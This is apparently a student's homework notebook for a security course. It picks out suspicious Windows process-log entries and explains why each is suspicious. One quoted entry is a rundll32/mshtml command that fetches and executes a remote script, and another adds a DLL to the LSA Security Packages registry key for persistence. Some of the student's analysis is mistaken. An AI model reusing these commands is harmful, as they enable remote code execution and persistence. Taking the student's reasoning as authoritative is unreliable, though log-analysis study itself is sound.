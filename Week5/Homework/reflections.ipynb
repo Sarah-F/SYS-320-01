{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Reflections"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Pick out 1 line of output from your results for each of the three attacks outlined below and explain why it is suspicious?\n",
    "\n",
    "### Registry\n",
    "```\n",
    "Arguments: C:\\Windows\\System32\\reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v Security Packages /t REG_expand_SZ /d C:\\Windows\\System32\\8b418uk61.dll\n",
    "Hostname: 0003FSINS\n",
    "Name: reg.exe\n",
    "Path: C:\\Windows\\System32\\reg.exe\n",
    "Pid: 1852\n",
    "Username: jasmin.washin\n",
    "```\n",
    "- This process is suspicious because it is trying to access the windows registry and add an hkey as well as a .dll (dynamic link library).\n",
    "\n",
    "\n",
    "### Scripts\n",
    "```\n",
    "Arguments: C:\\Windows\\System32\\rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:\\http://www.Ш3.com/netlgn.js'\").Exec();\"\n",
    "Hostname: 0003FXGWL\n",
    "Name: rundll32.exe\n",
    "Path: C:\\Windows\\System32\\rundll32.exe\n",
    "Pid: 592\n",
    "Username: darc.flore1\n",
    "```\n",
    "- This process is suspicious because, using javasript, the attacker is calling out to www.W3.com for a script to execute. They are possibly doing a remote code execution using mshtml. The rundll32.exe may also be malicious.\n",
    "\n",
    "### Powershell\n",
    "```\n",
    "Arguments: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Date\n",
    "Hostname: 0004YICSL\n",
    "Name: powershell.exe\n",
    "Path: C:\\Windows\\System32\\powershell.exe\n",
    "Pid: 3696\n",
    "Username: iankel\n",
    "```\n",
    "- This process is suspicious because powershell is running in the windows directory instead of the powershell directory (Looks at Arguments vs Path). This is bad because a malicious actor could execute a file directly onto the victim computer. \n",
    "\n",
    "```\n",
    "Arguments: \"C:\\Program Files\\internet explorer\\iexplore.exe\" \n",
    "Hostname: 0001TFKWC\n",
    "Name: iexplore.exe\n",
    "Path: C:\\Program Files\\internet explorer\n",
    "Pid: 3504\n",
    "Username: freyree\n",
    "```\n",
    "- The most suspicious thing about this process is that it uses internet explore even though ie has been killed off.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### What did you like the most and least about this assignment?\n",
    "- This assignment was interesting, but it was very hard get the code to execute properly"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### What additional questions do you have?\n",
    "- Is there any documentation I can study to help improve my skills."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.8.9 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.9"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "31f2aee4e71d21fbe5cf8b01ff0e069b9275f58929596ceb00d14d90e3e16cd6"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
